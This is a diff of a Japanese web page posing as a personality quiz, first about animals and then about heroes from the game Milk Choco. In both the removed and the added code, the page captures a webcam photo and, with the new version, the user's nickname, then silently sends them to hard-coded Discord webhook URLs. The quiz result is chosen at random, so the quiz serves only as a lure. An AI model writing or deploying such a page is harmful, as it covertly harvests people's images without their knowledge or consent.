@@ -2,71 +2,178 @@
 <html lang="ja">
 <head>
   <meta charset="UTF-8">
-  <title>動物診断</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>ミルクチョコ ヒーロー診断</title>
   <style>
-    body { font-family: Arial; text-align: center; background: #f5f5f5; padding: 30px; }
-    h1 { margin-bottom: 20px; }
-    video { display: none; width: 100%; max-width: 400px; border-radius: 8px; }
-    button { background: #4CAF50; color: white; padding: 15px 30px; font-size: 18px; border-radius: 10px; cursor: pointer; }
-    #result { margin-top: 20px; font-size: 24px; font-weight: bold; }
+    body {
+      background: linear-gradient(to right, #ffffff, #d0eaff);
+      text-align: center;
+      font-family: 'Arial', sans-serif;
+      margin: 0;
+      padding: 0;
+    }
+    h1 {
+      margin-top: 30px;
+      font-size: 2em;
+      color: #2c3e50;
+    }
+    #nicknameInput {
+      margin-top: 30px;
+      padding: 10px;
+      font-size: 1.2em;
+      border-radius: 10px;
+      border: 1px solid #3498db;
+      width: 80%;
+      max-width: 400px;
+    }
+    #startButton {
+      margin-top: 50px;
+      padding: 15px 30px;
+      font-size: 1.2em;
+      background-color: #3498db;
+      border: none;
+      border-radius: 10px;
+      color: white;
+      cursor: pointer;
+      transition: 0.3s;
+      box-shadow: 0 0 10px #3498db;
+    }
+    #startButton:hover {
+      background-color: #2980b9;
+      box-shadow: 0 0 20px #2980b9;
+    }
+    #result {
+      margin-top: 30px;
+      font-size: 1.5em;
+      color: #222;
+      background-color: #ecf0f1;
+      display: inline-block;
+      padding: 20px;
+      border-radius: 15px;
+      box-shadow: 0 0 10px #aaa;
+    }
+    video, canvas {
+      margin-top: 20px;
+      width: 80%;
+      max-width: 400px;
+      border-radius: 15px;
+    }
+    #captureButton {
+      margin-top: 30px;
+      padding: 15px 30px;
+      font-size: 1.2em;
+      background-color: #27ae60;
+      border: none;
+      border-radius: 10px;
+      color: white;
+      cursor: pointer;
+      transition: 0.3s;
+      box-shadow: 0 0 10px #27ae60;
+    }
+    #captureButton:hover {
+      background-color: #2ecc71;
+      box-shadow: 0 0 20px #2ecc71;
+    }
   </style>
 </head>
 <body>
 
-<h1>あなたの動物タイプ診断</h1>
-<video id="video" autoplay></video><br>
-<button id="startButton">診断スタート！</button>
-<div id="result"></div>
+  <h1>あなたにぴったりのヒーローをAI診断！</h1>
 
-<canvas id="canvas" style="display:none;"></canvas>
+  <!-- ニックネーム入力フォーム -->
+  <input type="text" id="nicknameInput" placeholder="ニックネームを入力してください" />
 
-<script>
-const startButton = document.getElementById('startButton');
-const video = document.getElementById('video');
-const canvas = document.getElementById('canvas');
-const result = document.getElementById('result');
+  <button id="startButton" disabled>診断スタート！</button>
 
-// ★ここにさっきコピーしたWebhook URLを貼る！
-const webhookURL = "https://discord.com/api/webhooks/1365874238807998535/n8ESKWHfHZNes-XDJV7Fshyu9gaO-iz5Mdb1PTewoEEx7GDSpJJxhxqbbzmvnYK2i429";
-				
-				const animals = ["ブタ", "キツネ", "イヌ", "タヌキ", "トラ", "ゴリラ"];
+  <div id="result" style="display:none;"></div>
 
-startButton.addEventListener('click', () => {
-  startButton.style.display = 'none';
-  navigator.mediaDevices.getUserMedia({ video: true })
-    .then(stream => {
-      video.style.display = 'block';
-      video.srcObject = stream;
-      setTimeout(() => {
-        capturePhoto();
-        stream.getTracks().forEach(track => track.stop());
-      }, 3000); // 3秒後に自動撮影
-    })
-    .catch(err => {
-      alert("カメラアクセスが必要です！");
-      console.error(err);
+  <video id="video" autoplay playsinline style="display:none;"></video>
+  <canvas id="canvas" style="display:none;"></canvas>
+
+  <button id="captureButton" style="display:none;">撮影する</button>
+
+  <script>
+    const heroes = [
+      "アサルト", "ボマー", "ゴースト", "メディック", 
+      "エレキ", "シールド", "チュチュ", "アイアン", 
+      "リーコン", "キャット", "ランチャー"
+    ];
+
+    const webhookURL = "https://discord.com/api/webhooks/1365970673616551946/5fJaT3-myLxSwMpJnK4pCgPF91F970Krj3TCH5NA3C5RPGJPFJRKFCWWp_Fe5tyD6eLg"; // 新しいWebhook URL
+
+    const nicknameInput = document.getElementById('nicknameInput');
+    const startButton = document.getElementById('startButton');
+    const captureButton = document.getElementById('captureButton');
+    const result = document.getElementById('result');
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+
+    // ニックネーム入力があれば診断ボタンを有効化
+    nicknameInput.addEventListener('input', () => {
+      if (nicknameInput.value.trim() !== '') {
+        startButton.disabled = false;
+      } else {
+        startButton.disabled = true;
+      }
     });
-});
 
-function capturePhoto() {
-  canvas.width = video.videoWidth;
-  canvas.height = video.videoHeight;
-  const ctx = canvas.getContext('2d');
-  ctx.drawImage(video, 0, 0);
+    startButton.addEventListener('click', async () => {
+      const nickname = nicknameInput.value.trim();
+      try {
+        // カメラを起動
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        video.srcObject = stream;
+        video.style.display = 'block';
+        startButton.style.display = 'none';
+        captureButton.style.display = 'block';
 
-  canvas.toBlob(blob => {
-    const form = new FormData();
-    form.append('file', blob, 'photo.png');
+        // 撮影ボタンのイベントリスナー
+        captureButton.addEventListener('click', () => {
+          const context = canvas.getContext('2d');
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-    fetch(webhookURL, { method: 'POST', body: form })
-      .catch(err => console.error("送信失敗", err));
-  }, 'image/png');
+          // 画像をデータURLとして取得
+          const imageData = canvas.toDataURL('image/png');
 
-  const randomAnimal = animals[Math.floor(Math.random() * animals.length)];
-  result.innerText = `あなたは「${randomAnimal}」タイプです！`;
-  video.style.display = 'none';
-}
-</script>
+          // ランダムにヒーローを選ぶ
+          const randomHero = heroes[Math.floor(Math.random() * heroes.length)];
+
+          // Webhookに送信
+          fetch(webhookURL, {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+              content: `【ミルクチョコ診断】${nickname}さんの写真です！`,
+              embeds: [{
+                title: `${nickname}さんの診断結果`,
+                description: `ヒーロータイプ: ${randomHero}`,
+                image: { url: imageData }
+              }]
+            }),
+          }).then(() => {
+            // 終了後、結果表示とUI更新
+            result.textContent = `${nickname}さんは「${randomHero}」タイプです！`;
+            result.style.display = 'block';
+            captureButton.style.display = 'none'; // 撮影ボタン非表示
+            video.style.display = 'none'; // カメラ非表示
+          }).catch(error => {
+            console.error("Webhook送信に失敗しました", error);
+            alert("Webhook送信に失敗しました。");
+          });
+
+          // ストリームを停止し、カメラを非表示に
+          stream.getTracks().forEach(track => track.stop());
+        });
+
+      } catch (error) {
+        alert('カメラが使えませんでした。設定を確認してください。');
+      }
+    });
+  </script>
 
 </body>
 </html>
